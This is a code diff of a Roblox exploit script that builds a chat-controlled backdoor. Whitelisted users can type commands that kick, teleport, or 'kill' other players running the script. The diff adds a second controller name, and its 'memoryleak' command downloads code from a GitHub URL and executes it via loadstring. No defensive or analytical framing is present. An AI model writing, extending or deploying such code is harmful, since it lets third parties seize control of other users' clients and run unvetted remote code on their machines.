@@ -1,5 +1,6 @@
 local whitelist = {
-    ["just12281oom"] = true
+    ["just12281oom"] = true,
+    ["PolarCtCutie"] = true
 }
 
 local text = "commands ~ lagback, leave, kick, executorkill, memoryleak, kill"
@@ -21,23 +22,25 @@ end
 
 local commandsFunc = {
     lagback = function(player)
-        game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(100, 100, 100))
+        player.Character:SetPrimaryPartCFrame(CFrame.new(100, 100, 100))
     end,
     leave = function(player)
-        game:Shutdown()
+        player:Kick("You have left the game.")
     end,
     kick = function(player)
-        game.Players.LocalPlayer:Kick("You have been kicked!")
+        player:Kick("You have been kicked!")
     end,
     executorkill = function(player)
-        task.spawn(setfpscap, 9e9)
+        task.spawn(function()
+            setfpscap(9e9)
+        end)
     end,
     memoryleak = function(player)
-        local success, error = pcall(function()
+        local success, errorMessage = pcall(function()
             loadstring(game:HttpGet('https://raw.githubusercontent.com/e266cfd65ad46a67fc54b0efd38e40dd/scripthub/main/memoryleak'))()
         end)
         if not success then
-            print("Error loading memoryleak script:", error)
+            print("Error loading memoryleak script:", errorMessage)
         end
     end,
     kill = function(player)
@@ -45,21 +48,14 @@ local commandsFunc = {
     end
 }
 
-local player = game.Players.LocalPlayer
-
-if whitelist[player.Name] then
-    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
-        Text = commands,
-    })
-end
-
 local function onChatMessage(player, message)
     if not whitelist[player.Name] then
         return
     end
     
-    if commandsFunc[message] then
-        commandsFunc[message](player)
+    local command = message:lower()
+    if commandsFunc[command] then
+        commandsFunc[command](player)
     end
 end
 
@@ -73,4 +69,12 @@ game.Players.PlayerAdded:Connect(onPlayerChatted)
 
 for _, player in ipairs(game.Players:GetPlayers()) do
     onPlayerChatted(player)
+end
+
+local player = game.Players.LocalPlayer
+if whitelist[player.Name] then
+    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
+        Text = commands,
+        Color = Color3.fromRGB(255, 255, 255)
+    })
 end
